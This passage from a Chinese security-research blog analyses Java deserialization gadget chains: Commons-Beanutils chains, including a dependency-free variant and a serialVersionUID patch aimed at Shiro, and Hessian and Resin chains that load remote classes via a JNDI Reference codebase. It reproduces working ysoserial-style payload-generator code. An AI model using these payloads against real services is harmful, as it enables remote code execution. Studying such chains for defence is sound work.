      <a data-url="http://example.com/2025/01/07/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhj0000fscxb9ek9l71" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CC链反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CB链反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CB链反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="需要CC依赖的CB"><a href="#需要CC依赖的CB" class="headerlink" title="需要CC依赖的CB"></a>需要CC依赖的CB</h1><p>PriorityQueue + BeanComparator + TemplatesImpl</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）Apache-Commons-Beanutils"><a href="#（1）Apache-Commons-Beanutils" class="headerlink" title="（1）Apache Commons Beanutils"></a>（1）Apache Commons Beanutils</h3><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。</p>
<h3 id="（2）BeanComparator"><a href="#（2）BeanComparator" class="headerlink" title="（2）BeanComparator"></a>（2）BeanComparator</h3><p>BeanComparator是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了</p>
<p>java.util.Comparator接口。</p>
<p>它的compare方法传入两个对象，如果this.property为空，则直接比较这两个对象；如果this.property不为空，则用PropertyUtils.getProperty分别取这两个对象的this.property属性，比较属性的值。</p>
<h3 id="（3）PropertyUtils-getProperty"><a href="#（3）PropertyUtils-getProperty" class="headerlink" title="（3）PropertyUtils.getProperty"></a>（3）PropertyUtils.getProperty</h3><p>commons-beanutils中提供了一个静态方法PropertyUtils.getProperty，让使用者可以直接调用任</p>
<p>意JavaBean的getter方法，比如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Cat</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>此时，commons-beanutils会自动找到name属性的getter方法，也就是getName，然后调用，获得返回值。</p>
<h3 id="（4）TemplatesImpl的getOutputProperties-方法"><a href="#（4）TemplatesImpl的getOutputProperties-方法" class="headerlink" title="（4）TemplatesImpl的getOutputProperties()方法"></a>（4）TemplatesImpl的getOutputProperties()方法</h3><p>TemplatesImpl的getOutputProperties()方法会调用newTransformer从而触发loader.defineClass。</p>
<p>想要触发TemplatesImpl的getOutputProperties()方法，利用BeanComparator设置property为outputProperties，在两个TemplatesImpl对象比较时，就会触发getOutputProperties()方法。</p>
<h3 id="（5）PriorityQueue-与Comparator"><a href="#（5）PriorityQueue-与Comparator" class="headerlink" title="（5）PriorityQueue 与Comparator"></a>（5）PriorityQueue 与Comparator</h3><p>PriorityQueue是一个优先队列，在构造时可以传入自定义的比较器，用于确定队列中元素的优先级，从而确定元素的顺序。</p>
<p>PriorityQueue#readObject()中调用了heapify()方法，heapify()中调用了siftDown()，siftDown()中调用了siftDownUsingComparator()，siftDownUsingComparator()中调用的comparator.compare()。（参考CC2）</p>
<h2 id="ysoserial-Payload"><a href="#ysoserial-Payload" class="headerlink" title="ysoserial Payload"></a>ysoserial Payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>







<p>PriorityQueue+BeanComparator+CaseInsensitiveComparator + TemplatesImpl</p>
<h1 id="不需要CC依赖的CB"><a href="#不需要CC依赖的CB" class="headerlink" title="不需要CC依赖的CB"></a>不需要CC依赖的CB</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）原来的CB链为什么需要-commons-collections-依赖"><a href="#（1）原来的CB链为什么需要-commons-collections-依赖" class="headerlink" title="（1）原来的CB链为什么需要 commons-collections 依赖"></a>（1）原来的CB链为什么需要 commons-collections 依赖</h3><p>ysoserial 中提到调用链需要 commons-collections 依赖，但是我们在实际调用链的构造时，并没有用到相关类，这是为什么？前面提到，在实例化 BeanComparator 时，如果没有指定 comparator，则默认会实例化一个 ComparableComparator ，而这个类是 commons-collections 包中的一个类。那么如果使用一个非 commons-collections 包的 comparator ，则可以实现纯 CB 利用。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732154517239-55eae504-5b83-46d8-8b19-3bcbb904ad61.png"></p>
<h3 id="（2）自定义-comparator"><a href="#（2）自定义-comparator" class="headerlink" title="（2）自定义 comparator"></a>（2）自定义 comparator</h3><p>在之前的分析中也提到构造 BeanComparator 时是可以自定义 comparator 的。</p>
<p>comparator 需要满足这三个条件，且尽量通用：</p>
<ul>
<li>实现 java.util.Comparator 接口</li>
<li>实现 java.io.Serializable 接口</li>
<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
</ul>
<p>在jdk中寻找符合条件的类，比如java.lang.String.CaseInsensitiveComparator、java.util.Collections.ReverseComparator，以 java.lang.String.CaseInsensitiveComparator 为例构建出 CB2 gadget，可以通过 String.CASE_INSENSITIVE_ORDER 方便的拿到该对象。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732154972050-349cc439-0232-40a7-a5e8-cdbcd3163b97.png"></p>
<p>Payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">    queue.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">    queue.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="（3）修改-serialVersionUID兼容1-8-3的commons-beanutils"><a href="#（3）修改-serialVersionUID兼容1-8-3的commons-beanutils" class="headerlink" title="（3）修改 serialVersionUID兼容1.8.3的commons-beanutils"></a>（3）修改 serialVersionUID兼容1.8.3的commons-beanutils</h3><p>ysoserial 中用的 commons-beanutils 组件版本是1.9.2，而 Shiro 自带的版本为 1.8.3，两个类发生了改动。序列化时会计算一个类的 serialVersionUID 写入数据流，在反序列化时如果环境中对应类计算 serialVersionUID 不同，则会报错。为了解决这个问题，我们可以将本地库换成相应版本，也可以手动修改serialVersionUID。</p>
<p>Payload</p>
<p>利用 javassist 建一个手动修改 serialVersionUID 的 BeanComparator。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">template</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);</span><br><span class="line">       <span class="type">CtField</span> <span class="variable">field</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;private static final long serialVersionUID = -3490850999041592962L;&quot;</span>, ctClass);</span><br><span class="line">       ctClass.addField(field);</span><br><span class="line">       <span class="type">Class</span> <span class="variable">beanCompareClazz</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">    </span><br><span class="line">       <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> (BeanComparator) beanCompareClazz.newInstance();</span><br><span class="line">       <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">       queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">       queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// switch method called by comparator</span></span><br><span class="line">       Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">       Reflections.setFieldValue(comparator, <span class="string">&quot;comparator&quot;</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// switch contents of queue</span></span><br><span class="line">       <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">       queueArray[<span class="number">0</span>] = template;</span><br><span class="line">       queueArray[<span class="number">1</span>] = template;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> queue;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>





<p>参考链接：<a target="_blank" rel="noopener" href="https://whoopsunix.com/docs/PPPYSO/gadgets/CommonsBeanutils">https://whoopsunix.com/docs/PPPYSO/gadgets/CommonsBeanutils</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlho0001fscx066n4ije" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CB链反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Hessian反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Hessian反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Hessian简介"><a href="#Hessian简介" class="headerlink" title="Hessian简介"></a>Hessian简介</h2><p>Hessian 的核心是 序列化协议，但它常被用于 RPC 场景，因此可以同时看作是一种远程调用协议。</p>
<p>Heasian使用二进制格式编码，比基于文本的协议（如 JSON 或 XML）更小、更快。</p>
<p>因为客户端和服务端都存在反序列化，所以客户端和服务端都存在反序列化漏洞。</p>
<h2 id="maven依赖"><a href="#maven依赖" class="headerlink" title="maven依赖"></a>maven依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">4.0</span><span class="number">.60</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><p>hessian也可以理解成RPC框架，也就是客户端远程调用服务端的方法。</p>
<p>服务端的实现类要继承HessianServlet或者作为 HessianServlet 的初始化参数进行配置。</p>
<p>当请求进来时，会由HessianServlet处理，而HessianServlet中会创建Hessian输入流HessianInput。</p>
<p>调用HessianInput的readObject方法反序列化请求内容。</p>
<p>可以理解为触发函数就是HessianInput#readObject。</p>
<h2 id="Hessian反序列化漏洞原理"><a href="#Hessian反序列化漏洞原理" class="headerlink" title="Hessian反序列化漏洞原理"></a>Hessian反序列化漏洞原理</h2><p>无论是构造方法、getter&#x2F;setter 方法、readObject 等等方法都不会在 Hessian 反序列化中被触发。</p>
<p>漏洞点是MapDeserializer#readMap 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。</p>
<p> HashMap 在 put 键值对时，将会对 key 的 hashcode 进行校验查看是否有重复的 key 出现，这就将会调用 key 的 hashCode 方法。</p>
<p>而 TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。</p>
<p><strong>入口点相当于都是Map的put方法，而不是readObject方法。</strong></p>
<p>也就是说 Hessian 相对比原生反序列化的利用链，有几个限制：</p>
<ul>
<li>kick-off chain 起始方法只能为 hashCode&#x2F;equals&#x2F;compareTo 方法；</li>
<li>利用链中调用的成员变量不能为 transient 修饰；</li>
<li>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑。</li>
</ul>
<p>这几个限制也导致了很多 Java 原生反序列化利用链在 Hessian 中无法使用，甚至 ysoserial 中一些明明是 hashCode&#x2F;equals&#x2F;compareTo 触发的链子都不能直接拿来用。</p>
<h2 id="Hessian-利用链"><a href="#Hessian-利用链" class="headerlink" title="Hessian 利用链"></a>Hessian 利用链</h2><p>目前常见的 Hessian 利用链在 marshalsec 中共有如下五个：</p>
<ul>
<li>Rome</li>
<li>XBean</li>
<li>Resin</li>
<li>SpringPartiallyComparableAdvisorHolder</li>
<li>SpringAbstractBeanFactoryPointcutAdvisor</li>
</ul>
<p>也就是抽象类 marshalsec.HessianBase 分别实现的 5 个接口。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732245691866-b61a8e80-0537-44af-9c27-a3d61fbed666.png"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/224280.html">https://www.freebuf.com/vuls/224280.html</a></p>
<p>项目地址：</p>
<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>rome本身有很多反序列化链，其中以hashmap开头的可以拿给hessian使用。</p>
<p>具体的见ROME反序列化文章。</p>
<h1 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h1><h2 id="Resin简介"><a href="#Resin简介" class="headerlink" title="Resin简介"></a>Resin简介</h2><p>Resin是一个轻量级的、高性能的开源Java应用服务器。它是由Caucho Technology开发的，旨在提供可靠的Web应用程序和服务的运行环境。和Tomcat一样是个服务器。和hessian是一个group。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;resin&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.64</span>&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.38</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<h2 id="Resin反序列化链"><a href="#Resin反序列化链" class="headerlink" title="Resin反序列化链"></a>Resin反序列化链</h2><hr>
<p><strong>HashMap+Xtring+QName+ContinuationDirContext</strong></p>
<p>Resin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 com.sun.org.apache.xpath.internal.objects.XString 的 equals 方法。</p>
<h4 id="（1）XString"><a href="#（1）XString" class="headerlink" title="（1）XString"></a>（1）XString</h4><p>是jdk中的一个类。</p>
<p>被marshalsec用来做o.toString方法的触发器。</p>
<p>如果XString和o的hash值一样，HashMap在put XString时就会调用XString的equals方法。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732264840436-31a65fdb-e7d3-49bb-81b4-2bd5b1c5d262.png"></p>
<p>Xtring.equal(Object obj2)方法会执行obj2的toString方法。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732265078067-72acfbc5-f52f-4b03-b1b7-925c72f12727.png"></p>
<h4 id="（2）QName"><a href="#（2）QName" class="headerlink" title="（2）QName"></a>（2）QName</h4><p>QName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 composeName 方法获取复合上下文的名称。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732265461853-d2a92a84-e19d-433a-a94a-f4f4f29e9980.png"></p>
<h4 id="（3）-ContinuationDirContext"><a href="#（3）-ContinuationDirContext" class="headerlink" title="（3） ContinuationDirContext"></a>（3） ContinuationDirContext</h4><p>jdk的类</p>
<p>javax.naming.spi.ContinuationDirContext的composeName方法（其实是父类ContinuationContext的composeName方法）会调用getTargetContext()方法</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732265947998-a4d1e442-e481-4bf9-9ab1-cf2cac37028f.png"></p>
<h4 id="（4）NamingManager"><a href="#（4）NamingManager" class="headerlink" title="（4）NamingManager"></a>（4）NamingManager</h4><p>jdk的类</p>
<p>然后调用NamingManager#getContext 方法传入其成员变量 CannotProceedException 的相关属性。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732266542662-0987f20c-0502-4df2-a940-fd3808864528.png"></p>
<p>NamingManager#getContext–&gt; NamingManager#getObjectInstance –&gt;getobjectFactoryFromReference–&gt;helper.loadClass</p>
<p><font style="color:rgb(0, 0, 0);">加载时使用了 URLClassLoader 并指定了类名和 codebase。</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732267032254-89046830-fe11-40b8-b22b-4d698046ea03.png"></p>
<p>这里的codebase是一个url,从cpe的成员resolveObj也就是ref中调用getFactoryClassLocation()取出,就是下面的args[0]。</p>
<p>而className则是从cpe的成员resolveObj也就是ref中调用getFactoryClassName()取出，就是下面的args[1]。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732267984840-45dd6141-f96b-49c5-a536-3f454ffdf3d4.png"></p>
<h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HashMap.put()</span><br><span class="line">XString.equals()</span><br><span class="line">QName.toString()</span><br><span class="line">ContinuationContext.composeName()</span><br><span class="line">ContinuationContext.getTargetContext()</span><br><span class="line">NamingManager.getContext()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NamingManager.getObjectFactoryFromReference() (javax.naming.spi)</span><br><span class="line">NamingManager.getObjectInstance() (javax.naming.spi)</span><br><span class="line">NamingManager.getContext() (javax.naming.spi)</span><br><span class="line">ContinuationContext.getTargetContext() (javax.naming.spi)</span><br><span class="line">ContinuationContext.composeName() (javax.naming.spi)   <span class="comment">// 关键点</span></span><br><span class="line">QName.toString() (com.caucho.naming)     <span class="comment">// 关键点</span></span><br><span class="line">XString.equals() (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.put()</span><br><span class="line">MapDeserializer.readMap()</span><br><span class="line">SerializerFactory.readMap()</span><br><span class="line">Hessian2Input.readObject()</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">ccCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line">Reflections.setFieldValue(cpe, <span class="string">&quot;cause&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">Reflections.setFieldValue(cpe, <span class="string">&quot;stackTrace&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">cpe.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Foo&quot;</span>, args[ <span class="number">1</span> ], args[ <span class="number">0</span> ]));</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(cpe, <span class="string">&quot;suppressedExceptions&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> (DirContext) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());</span><br><span class="line"><span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>(ctx, <span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> uf.makeToStringTriggerStable(qName);</span><br></pre></td></tr></table></figure>





